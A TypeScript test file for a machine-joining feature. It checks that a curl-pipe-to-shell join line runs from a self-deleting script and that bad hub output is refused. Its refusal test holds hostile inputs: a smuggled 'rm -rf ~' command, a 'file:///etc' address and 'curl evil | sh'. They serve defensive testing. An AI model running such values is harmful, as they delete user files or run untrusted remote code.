import { describe, expect, it } from "vitest";
import type { CallOutcome } from "../../shared/hub";
import type { TerminalDeps } from "../pairing/terminal";
import { connectComputer, joinLine } from "./connect";

const terminal = (over: Partial<TerminalDeps> = {}) => {
  const ran: Array<{ file: string; args: ReadonlyArray<string> }> = [];
  const scripts: string[] = [];
  const deps: TerminalDeps = {
    platform: "linux",
    home: "/home/dev",
    path: "/usr/bin",
    executable: (file) => file === "/usr/bin/x-terminal-emulator",
    exec: () => Promise.resolve(true),
    launch: (file, args) => {
      ran.push({ file, args });
      return Promise.resolve(true);
    },
    writeScript: (text, name) => {
      scripts.push(text);
      return `/tmp/fleetd-x/${name}`;
    },
    removeScript: () => undefined,
    ...over,
  };
  return { deps, ran, scripts };
};

const hub = (output: unknown, asked: unknown[] = []) => (tool: string, input: unknown): Promise<CallOutcome> => {
  asked.push({ tool, input });
  return Promise.resolve({ ok: true, output });
};

describe("Connect this computer", () => {
  it("asks for a join line with no machine name and runs it from a script that deletes itself, the code in no argument", async () => {
    const asked: unknown[] = [];
    const t = terminal();
    const out = await connectComputer(hub({ hubUrl: "https://acme.fleetd.dev", code: "fje_abc123", expiresAt: "2099-01-01T00:00:00Z", line: "ignored", gitIdentity: "Sam <sam@acme.example>" }, asked), t.deps);
    expect(out).toEqual({ ok: true, terminal: "a terminal" });
    expect(asked).toEqual([{ tool: "machine_join", input: {} }]);
    expect(t.ran).toEqual([{ file: "/usr/bin/x-terminal-emulator", args: ["-e", "/bin/sh", "/tmp/fleetd-x/fleetd-join.sh"] }]);
    expect(t.scripts[0]).toBe(
      `#!/bin/sh\nrm -f "$0"\nrmdir "$(dirname "$0")" 2>/dev/null\ncurl -fsSL https://fleetd.sh | sh -s -- --join https://acme.fleetd.dev --code fje_abc123 --git-identity 'Sam <sam@acme.example>'\necho\nprintf 'Press Return to close. '\nread -r _\n`,
    );
  });

  it("never runs the hub's own line, and refuses a code or address that isn't one", async () => {
    expect(joinLine("https://acme.fleetd.dev", "fje_x")).toBe("curl -fsSL https://fleetd.sh | sh -s -- --join https://acme.fleetd.dev --code fje_x");
    for (const output of [{ hubUrl: "https://acme.fleetd.dev", code: "x; rm -rf ~" }, { hubUrl: "file:///etc", code: "fje_x" }, { line: "curl evil | sh" }]) {
      const t = terminal();
      expect((await connectComputer(hub(output), t.deps)).ok).toBe(false);
      expect(t.ran).toEqual([]);
    }
  });

  it("says so when no terminal opens, or the hub refuses", async () => {
    const t = terminal({ executable: () => false });
    expect(await connectComputer(hub({ hubUrl: "https://acme.fleetd.dev", code: "fje_x" }), t.deps)).toEqual({ ok: false, message: "Couldn't open a terminal. Run the line below in one on this computer." });
    const refused = () => Promise.resolve({ ok: false as const, error: { code: "forbidden", message: "Only an owner or admin adds machines." } });
    expect(await connectComputer(refused, terminal().deps)).toEqual({ ok: false, message: "Only an owner or admin adds machines." });
  });
});
